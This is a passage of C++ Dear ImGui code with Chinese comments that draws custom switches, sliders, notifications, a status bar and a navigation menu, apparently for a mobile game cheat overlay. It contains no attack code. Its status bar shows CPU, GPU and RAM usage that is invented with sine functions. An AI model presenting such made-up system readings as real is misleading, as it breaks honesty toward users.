        bg_off_color.y + (bg_on_color.y - bg_off_color.y) * anim,
        bg_off_color.z + (bg_on_color.z - bg_off_color.z) * anim,
        bg_off_color.w + (bg_on_color.w - bg_off_color.w) * anim};
    ImU32 current_switch_bg = ImGui::ColorConvertFloat4ToU32(current_bg_color);
    draw_list->AddRectFilled(switch_pos, ImVec2(switch_pos.x + switch_width, switch_pos.y + switch_height), current_switch_bg, switch_height * 0.5f);
    float circle_radius = switch_height * 0.5f - 2.0f;
    float circle_x_off = switch_pos.x + circle_radius + 2.0f, circle_x_on = switch_pos.x + switch_width - circle_radius - 2.0f;
    float circle_x = ImLerp(circle_x_off, circle_x_on, anim);
    ImVec2 circle_center = ImVec2(circle_x, switch_pos.y + switch_height * 0.5f);
    draw_list->AddCircleFilled(ImVec2(circle_center.x + 1, circle_center.y + 1), circle_radius, IM_COL32(0, 0, 0, 50));
    draw_list->AddCircleFilled(circle_center, circle_radius, IM_COL32(255, 255, 255, 255));
    draw_list->AddCircle(circle_center, circle_radius - 1.0f, IM_COL32(255, 255, 255, 200), 0, 1.0f);
    float symbol_radius = circle_radius * 0.4f;
    ImU32 symbol_color_off = IM_COL32(150, 150, 150, 255), symbol_color_on = IM_COL32(76, 217, 100, 255);
    ImVec4 symbol_off_color = ImGui::ColorConvertU32ToFloat4(symbol_color_off), symbol_on_color = ImGui::ColorConvertU32ToFloat4(symbol_color_on);
    ImVec4 current_symbol_color = {
        symbol_off_color.x + (symbol_on_color.x - symbol_off_color.x) * anim,
        symbol_off_color.y + (symbol_on_color.y - symbol_off_color.y) * anim,
        symbol_off_color.z + (symbol_on_color.z - symbol_off_color.z) * anim,
        symbol_off_color.w + (symbol_on_color.w - symbol_off_color.w) * anim};
    ImU32 symbol_color = ImGui::ColorConvertFloat4ToU32(current_symbol_color);
    if (anim < 0.5f)
    {
        float scale = 1.0f - anim * 2.0f;
        if (scale > 0.01f)
            draw_list->AddLine(ImVec2(circle_center.x - symbol_radius * scale, circle_center.y), ImVec2(circle_center.x + symbol_radius * scale, circle_center.y), symbol_color, 2.0f);
    }
    else
    {
        float scale = (anim - 0.5f) * 2.0f;
        draw_list->AddLine(ImVec2(circle_center.x - symbol_radius * scale, circle_center.y), ImVec2(circle_center.x + symbol_radius * scale, circle_center.y), symbol_color, 2.0f);
        if (scale > 0.3f)
        {
            float vertical_scale = ImClamp((scale - 0.3f) / 0.7f, 0.0f, 1.0f);
            draw_list->AddLine(ImVec2(circle_center.x, circle_center.y - symbol_radius * vertical_scale), ImVec2(circle_center.x, circle_center.y + symbol_radius * vertical_scale), symbol_color, 2.0f);
        }
    }
    if (pressed)
    {
        *v = !*v;
        draw_list->AddCircle(ImVec2(pos.x + total_width * 0.5f, pos.y + total_height * 0.5f), 15.0f, IM_COL32(255, 255, 255, 150), 0, 2.0f);
    }
    return pressed;
}

float ImLerp(float a, float b, float t) { return a + (b - a) * t; }
float ImClamp(float v, float mn, float mx) { return (v < mn) ? mn : (v > mx) ? mx
                                                                             : v; }

// 复合按钮样式 - 支持多个选项（3个）
bool IOSStyleSegmentedCompound(const char *main_label, int *current_mode, const char *options[], int option_count)
{
    ImDrawList *draw_list = ImGui::GetWindowDrawList();
    float total_width = 370.0f, total_height = 60.0f;
    ImVec2 pos = ImGui::GetCursorScreenPos();
    char button_id[128];
    sprintf(button_id, "##CompSeg_%s", main_label);
    bool pressed = ImGui::InvisibleButton(button_id, ImVec2(total_width, total_height));
    bool is_hovered = ImGui::IsItemHovered();
    ImU32 bg_color = is_hovered ? IM_COL32(225, 225, 235, 255) : IM_COL32(240, 240, 250, 255);
    draw_list->AddRectFilled(pos, ImVec2(pos.x + total_width, pos.y + total_height), bg_color, 8.0f);
    draw_list->AddRect(pos, ImVec2(pos.x + total_width, pos.y + total_height), IM_COL32(0, 204, 255, 200), 8.0f, ImDrawFlags_RoundCornersAll, 2.0f);
    float padding = 20.0f, icon_size = 20.0f;
    float icon_y = pos.y + total_height * 0.5f, icon_x = pos.x + padding + icon_size * 0.5f;
    ImVec2 diamond_center = ImVec2(icon_x, icon_y);
    float diamond_radius = icon_size * 0.5f;
    ImVec2 diamond_points[4] = {
        ImVec2(diamond_center.x, diamond_center.y - diamond_radius),
        ImVec2(diamond_center.x + diamond_radius, diamond_center.y),
        ImVec2(diamond_center.x, diamond_center.y + diamond_radius),
        ImVec2(diamond_center.x - diamond_radius, diamond_center.y)};
    ImU32 diamond_color = is_hovered ? IM_COL32(65, 105, 225, 255) : IM_COL32(100, 149, 237, 255);
    draw_list->AddConvexPolyFilled(diamond_points, 4, diamond_color);
    draw_list->AddPolyline(diamond_points, 4, IM_COL32(255, 255, 255, 200), true, 1.5f);
    float time = ImGui::GetTime();
    float pulse_alpha = 100 + 155 * (sinf(time * 3.0f) * 0.5f + 0.5f);
    draw_list->AddCircleFilled(diamond_center, diamond_radius * 0.3f, IM_COL32(255, 255, 255, (int)pulse_alpha));
    float title_x = icon_x + icon_size + 15.0f;
    float title_y = pos.y + (total_height - ImGui::GetFontSize()) * 0.5f;
    draw_list->AddText(ImVec2(title_x, title_y), IM_COL32(30, 30, 30, 255), main_label);
    float segment_total_width = 180.0f, segment_button_height = 30.0f;
    float segment_button_width = segment_total_width / option_count;
    float segment_x = pos.x + total_width - segment_total_width - padding;
    float segment_y = pos.y + (total_height - segment_button_height) * 0.5f;
    bool changed = false;
    for (int i = 0; i < option_count; i++)
    {
        bool is_selected = (*current_mode == i);
        float seg_button_x = segment_x + i * segment_button_width;
        ImVec2 seg_button_min = ImVec2(seg_button_x, segment_y);
        ImVec2 seg_button_max = ImVec2(seg_button_x + segment_button_width, segment_y + segment_button_height);
        ImVec2 mouse_pos = ImGui::GetMousePos();
        bool seg_button_hovered = (mouse_pos.x >= seg_button_min.x && mouse_pos.x <= seg_button_max.x && mouse_pos.y >= seg_button_min.y && mouse_pos.y <= seg_button_max.y);
        ImU32 seg_button_color;
        if (is_selected)
            seg_button_color = IM_COL32(100, 149, 237, 255);
        else if (seg_button_hovered)
            seg_button_color = IM_COL32(255, 182, 193, 255);
        else
            seg_button_color = IM_COL32(229, 229, 234, 255);
        float corner_radius = 5.0f;
        ImDrawFlags round_flags = 0;
        if (i == 0)
            round_flags = ImDrawFlags_RoundCornersLeft;
        else if (i == option_count - 1)
            round_flags = ImDrawFlags_RoundCornersRight;
        draw_list->AddRectFilled(seg_button_min, seg_button_max, seg_button_color, corner_radius, round_flags);
        ImU32 seg_button_border = is_selected ? IM_COL32(0, 180, 70, 255) : IM_COL32(200, 200, 210, 255);
        draw_list->AddRect(seg_button_min, seg_button_max, seg_button_border, corner_radius, round_flags, 1.5f);
        const char *button_text = options[i];
        ImVec2 text_size = ImGui::CalcTextSize(button_text);
        float text_x = seg_button_x + (segment_button_width - text_size.x) * 0.5f;
        float text_y = segment_y + (segment_button_height - text_size.y) * 0.5f;
        ImU32 text_color = is_selected ? IM_COL32(255, 255, 255, 255) : seg_button_hovered ? IM_COL32(50, 50, 50, 255)
                                                                                           : IM_COL32(100, 100, 100, 255);
        draw_list->AddText(ImVec2(text_x, text_y), text_color, button_text);
        static std::unordered_map<int, bool> seg_button_pressed;
        int seg_button_id = ImGui::GetID(button_text) + i;
        if (seg_button_hovered && ImGui::IsMouseClicked(ImGuiMouseButton_Left))
            seg_button_pressed[seg_button_id] = true;
        if (seg_button_pressed[seg_button_id] && !ImGui::IsMouseDown(ImGuiMouseButton_Left))
        {
            if (seg_button_hovered)
            {
                *current_mode = i;
                changed = true;
            }
            seg_button_pressed[seg_button_id] = false;
        }
    }
    return changed;
}
// 添加提示框函数
void AddNotification(const std::string &message, bool isSuccess)
{
    Notification notif;
    notif.message = isSuccess ? (message + " 开启成功！") : (message + " 被关闭！");
    notif.start_time = std::chrono::steady_clock::now();
    notif.duration = NOTIFICATION_DURATION;
    notif.alpha = 1.0f;
    notif.isSuccess = isSuccess;
    notifications.push_back(notif);
}

// 绘制提示框函数
void DrawNotifications()
{
    auto current_time = std::chrono::steady_clock::now();
    ImDrawList *draw_list = ImGui::GetBackgroundDrawList();

    float start_y = 80.0f; // 从屏幕顶部开始，在三色球下方
    float padding = 10.0f;

    // 更新和绘制所有提示框
    for (auto it = notifications.begin(); it != notifications.end();)
    {
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                           current_time - it->start_time)
                           .count() /
                       1000.0f;

        if (elapsed >= it->duration)
        {
            // 移除过期的提示框
            it = notifications.erase(it);
        }
        else
        {
            // 计算透明度（淡出效果）
            float progress = elapsed / it->duration;
            it->alpha = 1.0f - progress * progress; // 非线性淡出

            // 绘制圆角矩形背景
            ImVec2 text_size = ImGui::CalcTextSize(it->message.c_str());
            ImVec2 rect_min = ImVec2(padding, start_y);
            ImVec2 rect_max = ImVec2(padding + text_size.x + 20.0f, start_y + text_size.y + 10.0f);

            // 根据状态选择颜色
            ImU32 bg_color, border_color, text_color;

            if (it->isSuccess)
            {
                // 成功颜色 - 绿色系
                bg_color = IM_COL32(0, 0, 0, (int)(0 * it->alpha));         // 深绿背景
                border_color = IM_COL32(0, 255, 0, (int)(220 * it->alpha)); // 亮绿边框
                text_color = IM_COL32(0, 255, 0, (int)(255 * it->alpha));   // 浅绿文字
            }
            else
            {
                // 关闭颜色 - 红色系
                bg_color = IM_COL32(0, 0, 0, (int)(0 * it->alpha));         // 深红背景
                border_color = IM_COL32(255, 0, 0, (int)(220 * it->alpha)); // 亮红边框
                text_color = IM_COL32(255, 0, 0, (int)(255 * it->alpha));   // 浅红文字
            }

            // 绘制圆角矩形
            draw_list->AddRectFilled(rect_min, rect_max, bg_color, 8.0f);
            draw_list->AddRect(rect_min, rect_max, border_color, 8.0f, 0, 2.0f);

            // 绘制文字
            ImVec2 text_pos = ImVec2(rect_min.x + 10.0f, rect_min.y + 5.0f);
            draw_list->AddText(text_pos, text_color, it->message.c_str());

            start_y += text_size.y + 15.0f; // 下一个提示框的位置
            ++it;
        }
    }
}

bool ToggleButton(const char *label, bool *v)
{
    ImDrawList *draw_list = ImGui::GetWindowDrawList();
    ImVec2 pos = ImGui::GetCursorScreenPos();
    ImVec2 size = ImVec2(120, 40);
    bool pressed = ImGui::InvisibleButton(label, size);
    ImU32 bg_color = *v ? IM_COL32(0, 150, 255, 255) : IM_COL32(80, 80, 80, 255);
    ImU32 border_color = *v ? IM_COL32(100, 200, 255, 255) : IM_COL32(120, 120, 120, 255);
    draw_list->AddRectFilled(pos, ImVec2(pos.x + size.x, pos.y + size.y), bg_color, 8.0f);
    draw_list->AddRect(pos, ImVec2(pos.x + size.x, pos.y + size.y), border_color, 8.0f, 0, 2.0f);
    if (*v)
        draw_list->AddRect(pos, ImVec2(pos.x + size.x, pos.y + size.y), IM_COL32(100, 200, 255, 100), 8.0f, 0, 3.0f);
    ImVec2 text_size = ImGui::CalcTextSize(label);
    ImVec2 text_pos = ImVec2(pos.x + (size.x - text_size.x) * 0.5f, pos.y + (size.y - text_size.y) * 0.5f);
    draw_list->AddText(text_pos, IM_COL32(255, 255, 255, 255), label);
    ImVec2 dot_pos = ImVec2(pos.x + size.x - 12, pos.y + 8);
    ImU32 dot_color = *v ? IM_COL32(0, 255, 0, 255) : IM_COL32(255, 0, 0, 255);
    draw_list->AddCircleFilled(dot_pos, 4.0f, dot_color);
    if (pressed)
        *v = !*v;
    return pressed;
}

void CustomNewLine(float lineHeight = -1.0f)
{
    if (lineHeight < 0.0f)
    {
        // 使用默认的行高
        ImGui::NewLine();
    }
    else
    {
        // 设置自定义行高
        ImGui::Dummy(ImVec2(0.0f, lineHeight));
    }
}

long long getCurrentTimestamp1()
{
    using namespace std::chrono;
    auto now = system_clock::now();
    // 转换为分钟精度（除以60000毫秒）
    return duration_cast<minutes>(now.time_since_epoch()).count();
}

// 在文件顶部，using namespace std; 之后添加
void 更新状态();
char anbuffer[256];
char kernelBuffer[256];
struct DriverState
{
    bool current_state = false;
    bool pending_state = false;
    float transition_start = 0.0f;
};
DriverState driver_state;

// 在颜色定义区域添加新颜色
ImU32 check_blue = IM_COL32(0, 122, 255, 255);
ImU32 check_gray = IM_COL32(199, 199, 204, 255);
ImU32 check_bg_hover = IM_COL32(224, 224, 224, 255);

bool CustomerCheckBox(const char *label, bool *v, float rounding = 0.9f)
{
    ImGuiStyle &style = ImGui::GetStyle();
    ImDrawList *drawList = ImGui::GetWindowDrawList();
    ImVec2 pos = ImGui::GetCursorScreenPos();
    float height = ImGui::GetFrameHeight();
    float width = height * 2.0f;
    float radius = height * 0.5f;

    // 移除breath_alpha相关计算
    ImU32 bgColor = *v ? IM_COL32(25, 120, 200, 255) : // 固定透明度
                        IM_COL32(40, 50, 60, 120);
    ImU32 borderColor = IM_COL32(0, 255, 255, 255); // 固定边框透明度
    ImU32 circleColor = *v ? IM_COL32(0, 150, 255, 255) : IM_COL32(100, 300, 120, 200);
    drawList->AddRectFilled(pos, ImVec2(pos.x + width, pos.y + height), bgColor, radius * rounding);
    drawList->AddRect(pos, ImVec2(pos.x + width, pos.y + height), borderColor, radius * rounding, 0, 2.0f);
    float circleOffset = *v ? (width - height) : 0.0f;
    ImVec2 circleCenter = ImVec2(pos.x + radius + circleOffset, pos.y + radius);
    if (*v)
    {
        drawList->AddCircle(circleCenter, radius * 1.2f,
                            IM_COL32(0, 300, 255, 100), // 固定光晕透明度
                            0, 3.0f);
    }
    drawList->AddCircleFilled(circleCenter, radius - 2.0f, circleColor);
    if (ImGui::InvisibleButton(label, ImVec2(width, height)))
    {
        *v = !*v;
    }
    ImGui::SameLine();
    ImGui::TextColored(ImVec4(0.4f, 0.8f, 1.0f, 1.0f), "%s", label);

    return *v;
}

string 获取武器名称(int 武器ID)
{
    if (auto it = 绘制.武器名字.find(武器ID); it != 绘制.武器名字.end())
    {
        return it->second;
    }
    return "未收录";
}

#define MAX_EVENTS 10

int 布局::MonitorVolumeKeys()
// 已弃用 - 改为圆球点击控制
{
    // 此函数不再使用，保留空实现
    return 0;
}

// 添加绘制三色球的函数
void DrawThreeColorBalls()
{
    ImDrawList *draw_list = ImGui::GetBackgroundDrawList();
    ImVec2 displaySize = ImGui::GetIO().DisplaySize;
    if (displaySize.x <= 0 || displaySize.y <= 0)
        return; // 防止无效分辨率

    float ball_radius = 10.0f;
    float rect_length = 120.0f;
    float rect_height = 20.0f;
    float center_x = displaySize.x / 2;
    float center_y = 50.0f;

    ImVec2 rect_min = ImVec2(center_x - rect_length / 2, center_y - rect_height / 2);
    ImVec2 rect_max = ImVec2(center_x + rect_length / 2, center_y + rect_height / 2);

    // 绘制透明矩形（用于点击检测）
    draw_list->AddRectFilled(rect_min, rect_max, IM_COL32(128, 128, 128, 0));
    draw_list->AddRect(rect_min, rect_max, IM_COL32(100, 100, 100, 0), 0.0f, 0, 2.0f);
}

extern bool g_login_success;
extern bool g_announcement_passed;

// 现代右滑块开关：文字在左，滑块在右，带动画
bool ModernSwitchRight(const char *label, bool *v, float switch_width = 44.0f, float switch_height = 24.0f)
{
    ImGuiWindow *window = ImGui::GetCurrentWindow();
    if (window->SkipItems)
        return false;

    ImGuiContext &g = *GImGui;
    const ImGuiStyle &style = g.Style;
    const ImGuiID id = window->GetID(label);

    const ImVec2 label_size = ImGui::CalcTextSize(label);
    const float spacing = 10.0f;
    const float total_width = label_size.x + spacing + switch_width;

    const ImVec2 switch_size(switch_width, switch_height);
    const float frame_height = ImMax(label_size.y, switch_size.y);
    const ImVec2 total_size(total_width, frame_height + style.FramePadding.y * 2.0f);

    const ImVec2 pos = window->DC.CursorPos;
    const ImVec2 pos_max = ImVec2(pos.x + total_size.x, pos.y + total_size.y);
    const ImRect total_bb(pos, pos_max);

    ImGui::ItemSize(total_bb, style.FramePadding.y);
    if (!ImGui::ItemAdd(total_bb, id))
        return false;

    bool hovered, held;
    bool pressed = ImGui::ButtonBehavior(total_bb, id, &hovered, &held);
    if (pressed)
        *v = !*v;

    // 动画状态
    static std::unordered_map<ImGuiID, float> anim_state;
    if (anim_state.find(id) == anim_state.end())
        anim_state[id] = *v ? 1.0f : 0.0f;
    float &anim = anim_state[id];
    float target = *v ? 1.0f : 0.0f;
    anim = ImLerp(anim, target, ImGui::GetIO().DeltaTime * 8.0f);
    if (anim < 0.01f)
        anim = 0.0f;
    if (anim > 0.99f)
        anim = 1.0f;

    ImDrawList *dl = window->DrawList;

    // ★ 文字颜色跟随主题
    // ImU32 text_color = ImGui::GetColorU32(hovered ? ImGuiCol_ButtonHovered : ImGuiCol_Text);
    ImU32 text_color = ImGui::GetColorU32(ImGuiCol_Text); // 文字颜色固定为默认主题文本颜色，不做悬停变化
    float text_x = pos.x;
    float text_y = pos.y + (frame_height - label_size.y) * 0.5f;
    dl->AddText(ImVec2(text_x, text_y), text_color, label);

    // 滑块部分保持不变
    float switch_x = pos.x + label_size.x + spacing;
    float switch_y = pos.y + (frame_height - switch_height) * 0.5f;
    ImVec2 switch_min(switch_x, switch_y);
    ImVec2 switch_max(switch_x + switch_width, switch_y + switch_height);

    ImU32 bg_off = IM_COL32(60, 60, 60, 255);
    ImU32 bg_on = IM_COL32(0, 200, 100, 255);
    ImU32 bg_current = ImGui::GetColorU32(ImLerp(ImGui::ColorConvertU32ToFloat4(bg_off),
                                                 ImGui::ColorConvertU32ToFloat4(bg_on), anim));
    dl->AddRectFilled(switch_min, switch_max, bg_current, switch_height * 0.5f);

    float knob_radius = switch_height * 0.5f - 2.0f;
    float knob_x_off = switch_min.x + knob_radius + 2.0f;
    float knob_x_on = switch_max.x - knob_radius - 2.0f;
    float knob_x = ImLerp(knob_x_off, knob_x_on, anim);
    ImVec2 knob_center(knob_x, switch_min.y + switch_height * 0.5f);
    dl->AddCircleFilled(knob_center, knob_radius, IM_COL32(255, 255, 255, 255));
    dl->AddCircle(knob_center, knob_radius - 1.0f, IM_COL32(200, 200, 200, 80), 12, 1.0f);

    return pressed;
}

// 现代滑块（浮点数），带圆角轨道与动态把手，右侧显示数值
bool ModernSliderFloat(const char *label, float *v, float v_min, float v_max, const char *format = "%.1f", float width = 250.0f)
{
    ImGuiWindow *window = ImGui::GetCurrentWindow();
    if (window->SkipItems)
        return false;

    ImGuiContext &g = *GImGui;
    const ImGuiStyle &style = g.Style;
    const ImGuiID id = window->GetID(label);
    const float label_width = ImGui::CalcTextSize(label).x;
    const float slider_width = width;
    const float total_height = 28.0f;
    const float total_width = label_width + 10.0f + slider_width + 60.0f; // 标签 + 间距 + 滑块 + 数值

    const ImVec2 pos = window->DC.CursorPos;
    const ImRect total_bb(pos, ImVec2(pos.x + total_width, pos.y + total_height));
    ImGui::ItemSize(total_bb, style.FramePadding.y);
    if (!ImGui::ItemAdd(total_bb, id))
        return false;

    // 标签文字
    ImGui::RenderText(ImVec2(pos.x, pos.y + (total_height - ImGui::GetFontSize()) * 0.5f), label);

    // 滑块区域
    const float slider_x = pos.x + label_width + 10.0f;
    const float slider_y = pos.y + (total_height - 8.0f) * 0.5f; // 轨道高度8px
    const float slider_h = 8.0f;
    const ImVec2 slider_min(slider_x, slider_y);
    const ImVec2 slider_max(slider_x + slider_width, slider_y + slider_h);
    const ImVec2 grab_min(slider_x, pos.y);
    const ImVec2 grab_max(slider_x + slider_width, pos.y + total_height);

    // 交互区域（覆盖整个把手可拖动范围）
    bool value_changed = false;
    bool hovered, held;
    bool pressed = ImGui::ButtonBehavior(ImRect(grab_min, grab_max), id, &hovered, &held);

    // 计算把手位置
    float t = (*v - v_min) / (v_max - v_min);
    if (t < 0.0f)
        t = 0.0f;
    if (t > 1.0f)
        t = 1.0f;
    const float knob_radius = 8.0f;
    float knob_x = slider_min.x + t * slider_width;
    if (held || pressed)
    {
        // 拖动时更新值
        float mouse_x = ImGui::GetIO().MousePos.x;
        if (mouse_x < slider_min.x)
            mouse_x = slider_min.x;
        if (mouse_x > slider_max.x)
            mouse_x = slider_max.x;
        t = (mouse_x - slider_min.x) / slider_width;
        *v = v_min + t * (v_max - v_min);
        if (*v < v_min)
            *v = v_min;
        if (*v > v_max)
            *v = v_max;
        value_changed = true;
        knob_x = mouse_x;
    }

    ImDrawList *dl = window->DrawList;

    // 绘制轨道背景
    dl->AddRectFilled(slider_min, slider_max, IM_COL32(60, 60, 60, 255), 4.0f);
    // 绘制轨道激活部分（渐变蓝）
    ImU32 active_track = IM_COL32(0, 200, 255, 200);
    dl->AddRectFilled(slider_min, ImVec2(knob_x, slider_min.y + slider_h), active_track, 4.0f);

    // 光晕效果
    if (hovered || held)
    {
        dl->AddCircleFilled(ImVec2(knob_x, slider_min.y + slider_h * 0.5f), knob_radius + 2.0f,
                            IM_COL32(0, 200, 255, 80));
    }

    // 把手
    dl->AddCircleFilled(ImVec2(knob_x, slider_min.y + slider_h * 0.5f), knob_radius, IM_COL32(255, 255, 255, 255));
    dl->AddCircle(ImVec2(knob_x, slider_min.y + slider_h * 0.5f), knob_radius, IM_COL32(0, 200, 255, 100), 0, 1.5f);

    // 数值显示（右侧）
    char value_buf[32];
    snprintf(value_buf, sizeof(value_buf), format, *v);
    ImGui::RenderText(ImVec2(slider_max.x + 10.0f, pos.y + (total_height - ImGui::GetFontSize()) * 0.5f), value_buf);

    return value_changed;
}

// 现代滑块（整数），与浮点类似
bool ModernSliderInt(const char *label, int *v, int v_min, int v_max, const char *format = "%.0f", float width = 250.0f)
{
    float f_val = (float)*v;
    if (ModernSliderFloat(label, &f_val, (float)v_min, (float)v_max, format, width))
    {
        *v = (int)(f_val + 0.5f);
        return true;
    }
    return false;
}

// ---------- 绘制顶部状态栏 ----------
void DrawTopStatusBar()
{
    ImDrawList *draw_list = ImGui::GetForegroundDrawList();
    ImGuiViewport *viewport = ImGui::GetMainViewport();
    ImVec2 work_pos = viewport->WorkPos;
    ImVec2 work_size = viewport->WorkSize;

    // 稍微增高一点，增加UI的呼吸感
    float bar_height = 36.0f;
    ImVec2 bar_min = ImVec2(work_pos.x, work_pos.y);
    ImVec2 bar_max = ImVec2(work_pos.x + work_size.x, work_pos.y + bar_height);

    // 1. 背景：稍微现代化一点的颜色，带有非常淡的渐变或透明度
    ImU32 bgColor = IM_COL32(18, 20, 24, (int)(245 * statusBarAlpha));
    draw_list->AddRectFilled(bar_min, bar_max, bgColor);

    // 底部高光边缘，使用微亮的白色替代黑色粗线，增加立体感
    draw_list->AddLine(ImVec2(bar_min.x, bar_max.y), ImVec2(bar_max.x, bar_max.y),
                       IM_COL32(255, 255, 255, (int)(20 * statusBarAlpha)), 1.0f);

    // 精准垂直居中：(总高度 - 字体高度) / 2
    float text_y = work_pos.y + (bar_height - ImGui::GetFontSize()) * 0.9f;
    float margin = 100.0f; // 缩小了两侧边距，适应性更好
    float cursor_x = work_pos.x + margin;

    // 2. 品牌文字 - 使用纯白色突出显示
    const char *brandName = "@Auranh666";
    draw_list->AddText(ImVec2(cursor_x, text_y),
                       IM_COL32(255, 255, 255, (int)(255 * statusBarAlpha)), brandName);
    // 修复了原代码中字符串宽度计算不一致的问题
    cursor_x += ImGui::CalcTextSize(brandName).x + 40.0f;

    // 3. 硬件信息面板 (分离标签与数值的颜色)
    float right_reserved = 180.0f;
    float right_boundary = work_pos.x + work_size.x - margin - right_reserved;

    auto AddInfoText = [&](const char *label, const char *fmt, ...)
    {
        char valBuf[32];
        va_list args;
        va_start(args, fmt);
        vsnprintf(valBuf, sizeof(valBuf), fmt, args);
        va_end(args);

        ImVec2 labelSize = ImGui::CalcTextSize(label);
        ImVec2 valSize = ImGui::CalcTextSize(valBuf);

        if (cursor_x + labelSize.x + valSize.x > right_boundary)
            return;

        // 绘制标签 (较暗)
        draw_list->AddText(ImVec2(cursor_x, text_y),
                           IM_COL32(140, 145, 150, (int)(255 * statusBarAlpha)), label);
        cursor_x += labelSize.x + 4.0f; // 标签和数值之间的微小间距

        // 绘制数值 (较亮)
        draw_list->AddText(ImVec2(cursor_x, text_y),
                           IM_COL32(220, 225, 230, (int)(255 * statusBarAlpha)), valBuf);
        cursor_x += valSize.x + 20.0f; // 不同信息组之间的间距
    };

    // 补充百分比符号，观感更佳
    AddInfoText("FPS", "%d", g_FPS);
    AddInfoText("CPU", "%.0f%%", 25.0f + 10.0f * sin(ImGui::GetTime()));
    AddInfoText("GPU", "%.0f%%", 30.0f + 15.0f * cos(ImGui::GetTime() * 0.8f));
    AddInfoText("RAM", "%.0f%%", 42.0f + 8.0f * sin(ImGui::GetTime() * 1.2f));

    // 4. 右侧信息 (时间与电池)
    float right_x = work_pos.x + work_size.x - margin;

    // 时间
    std::time_t now = std::time(nullptr);
    char timeBuf[32];
    std::strftime(timeBuf, sizeof(timeBuf), "%H:%M", std::localtime(&now));
    ImVec2 timeSize = ImGui::CalcTextSize(timeBuf);
    right_x -= timeSize.x;
    draw_list->AddText(ImVec2(right_x, text_y),
                       IM_COL32(230, 230, 230, (int)(255 * statusBarAlpha)), timeBuf);

    right_x -= 15.0f; // 时间与电池的间距

    // 电池
    int batteryLevel = -1;
    FILE *capFile = fopen("/sys/class/power_supply/battery/capacity", "r");
    if (capFile)
    {
        fscanf(capFile, "%d", &batteryLevel);
        fclose(capFile);
    }

    if (batteryLevel >= 0)
    {
        char batBuf[32];
        snprintf(batBuf, sizeof(batBuf), "%d%%", batteryLevel);
        ImVec2 batSize = ImGui::CalcTextSize(batBuf);
        right_x -= batSize.x;
        draw_list->AddText(ImVec2(right_x, text_y),
                           IM_COL32(200, 200, 200, (int)(255 * statusBarAlpha)), batBuf);

        // 绘制动态电池图标
        float icon_w = 20.0f;
        float icon_h = 10.0f;
        float icon_x = right_x - icon_w - 6.0f;
        float icon_y = text_y + (ImGui::GetFontSize() - icon_h) * 0.5f; // 图标垂直居中

        ImU32 batOutlineCol = IM_COL32(150, 150, 150, (int)(255 * statusBarAlpha));
        // 电量大于20%显示绿色，否则显示红色警告
        ImU32 batFillCol = batteryLevel > 20 ? IM_COL32(120, 210, 120, (int)(255 * statusBarAlpha))
                                             : IM_COL32(240, 80, 80, (int)(255 * statusBarAlpha));

        // 电池外壳
        draw_list->AddRect(ImVec2(icon_x, icon_y), ImVec2(icon_x + icon_w, icon_y + icon_h),
                           batOutlineCol, 1.5f, 0, 1.0f);
        // 电池正极触点
        draw_list->AddRectFilled(ImVec2(icon_x + icon_w, icon_y + 2.5f), ImVec2(icon_x + icon_w + 2.0f, icon_y + icon_h - 2.5f),
                                 batOutlineCol);

        // 根据百分比填充电池内部
        float fill_w = (icon_w - 3.0f) * (batteryLevel / 100.0f);
        if (fill_w > 0)
        {
            draw_list->AddRectFilled(ImVec2(icon_x + 1.5f, icon_y + 1.5f), ImVec2(icon_x + 1.5f + fill_w, icon_y + icon_h - 1.5f),
                                     batFillCol);
        }
    }
}

// ---------- 左侧导航 ----------
void DrawLeftNavigation(int &selectedMenu)
{
    ImGui::BeginChild("##LeftNav", ImVec2(260, -1), true);
    ImGui::SetCursorPosY(30.0f);
    const char *menuItems[] = {"主页", "人物", "物资", "视觉", "颜色", "设置"};
    int iconIndices[] = {300, 301, 302, 303, 304, 305};

    const float iconSize = 30.0f;
    const float iconTextSpacing = 12.0f;
    const float itemSpacing = 24.0f;

    for (int i = 0; i < IM_ARRAYSIZE(menuItems); i++)
    {
        bool selected = (selectedMenu == i);
        float avail = ImGui::GetContentRegionAvail().x - 20.0f;
        ImVec2 btnSize(avail, 70.0f);
        ImVec2 cursor = ImGui::GetCursorScreenPos();
        ImDrawList *dl = ImGui::GetWindowDrawList();

        // 普通边框
        dl->AddRect(cursor, ImVec2(cursor.x + btnSize.x, cursor.y + btnSize.y),
                    IM_COL32(80, 80, 90, 60), 8.0f, 0, 1.0f);

        // 选中背景
        if (selected)
        {
            dl->AddRectFilled(cursor, ImVec2(cursor.x + btnSize.x, cursor.y + btnSize.y),
                              IM_COL32(30, 120, 200, 80), 8.0f);
            dl->AddRect(cursor, ImVec2(cursor.x + btnSize.x, cursor.y + btnSize.y),
                        IM_COL32(50, 150, 230, 150), 8.0f, 0, 2.0f);
        }

        // 计算内容水平居中
        ImVec2 textSize = ImGui::CalcTextSize(menuItems[i]);
        float totalContentWidth = iconSize + iconTextSpacing + textSize.x;
        float contentStartX = cursor.x + (btnSize.x - totalContentWidth) * 0.5f;

        // 绘制图标
        auto it = 手持图片.find(iconIndices[i]);
        if (it != 手持图片.end() && it->second.DS != nullptr)
        {
            ImVec2 iconPos(contentStartX, cursor.y + (btnSize.y - iconSize) * 0.5f);
            dl->AddImage(it->second.DS, iconPos, ImVec2(iconPos.x + iconSize, iconPos.y + iconSize));
        }

        // ★ 文字颜色跟随主题（选中高亮，未选中弱化）
        ImU32 textColor = ImGui::GetColorU32(selected ? ImGuiCol_Text : ImGuiCol_TextDisabled);
        float textX = contentStartX + iconSize + iconTextSpacing;
        float textY = cursor.y + (btnSize.y - textSize.y) * 0.5f;
        dl->AddText(ImVec2(textX, textY), textColor, menuItems[i]);

        ImGui::SetCursorScreenPos(cursor);
        if (ImGui::InvisibleButton(menuItems[i], btnSize))
            selectedMenu = i;
        ImGui::SetCursorScreenPos(ImVec2(cursor.x, cursor.y + btnSize.y + itemSpacing));
    }
    ImGui::EndChild();
}

// ---------- 主页 ----------
void DrawHomePage()
{
    // ── 全局布局常量 ──────────────────────────────────────────────────
    constexpr float kSideMargin = 20.0f;
    constexpr float kCardGap = 16.0f;
    constexpr float kInnerPad = 18.0f;

    constexpr float kStatusH = 96.0f;
    constexpr float kSecondH = 242.0f; // 标题46 + 内容居中
    constexpr float kBottomH = 78.0f;

    // 标题区域结束位置（两列共用）
    constexpr float kContentTop = 46.0f;

    const float outerAvailW = ImGui::GetContentRegionAvail().x;
    const float availW = outerAvailW - kSideMargin * 2;
    const float halfW = (availW - kCardGap) * 0.5f;

    ImGui::BeginChild("##HomeContent", ImVec2(-1, -1), false);
    {
        // =============================================================
